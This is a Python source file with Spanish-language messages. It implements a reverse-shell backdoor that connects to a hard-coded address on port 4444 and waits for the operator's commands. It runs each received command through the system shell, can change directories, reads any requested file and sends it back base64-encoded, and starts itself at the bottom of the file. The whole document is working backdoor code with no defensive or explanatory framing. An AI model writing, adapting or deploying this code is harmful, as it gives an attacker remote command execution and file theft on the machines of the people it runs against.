import socket
import subprocess
import json
import os
import base64

class Main:
    def __init__(self, ip, port):
        self.connection = socket.socket(socket.AF_INET, socket.SOCK_STREAM)
        self.connection.connect((ip, port))

    def cmd(self, command):
        try:
            return subprocess.check_output(command, shell=True, stderr=subprocess.STDOUT).decode('utf-8')
        except subprocess.CalledProcessError as e:
            return f"Error ejecutando comando: {e.output.decode('utf-8')}"

    def reliable_send(self, data):
        if isinstance(data, bytes):
            # Enviar primero la longitud del archivo
            json_data = json.dumps({"size": len(data)})
            self.connection.send(json_data.encode('utf-8'))
            # Luego, enviar el archivo en sí, codificado en base64
            self.connection.send(base64.b64encode(data))
        else:
            json_data = json.dumps(data)
            self.connection.send(json_data.encode('utf-8'))

    def reliable_receive(self):
        json_data = ""
        while True:
            try:
                json_data = json_data + self.connection.recv(1024).decode('utf-8')
                return json.loads(json_data)
            except ValueError:
                continue

    def change_directory(self, path):
        try:
            os.chdir(path)
            return f"Cambiando de directorio a {path}"
        except FileNotFoundError:
            return f"Error: No se pudo cambiar al directorio {path}"

    def leer_archivo(self, archivo):
        try:
            with open(archivo, 'rb') as file:
                contenido = file.read()
                return contenido
        except FileNotFoundError:
            return f"Error: El archivo {archivo} no existe."

    def run(self):
        while True:
            command = self.reliable_receive()
            if command[0] == "exit":
                self.connection.close()
                exit()
            elif command[0] == "cd" and len(command) > 1:
                result = self.change_directory(command[1])
            elif command[0] == "cd":
                result = self.change_directory(os.path.expanduser("~"))
            elif command[0] == "download":
                result = self.leer_archivo(command[1])
            else:
                result = self.cmd(" ".join(command))
            self.reliable_send(result)

door = Main("192.168.0.107", 4444)
door.run()
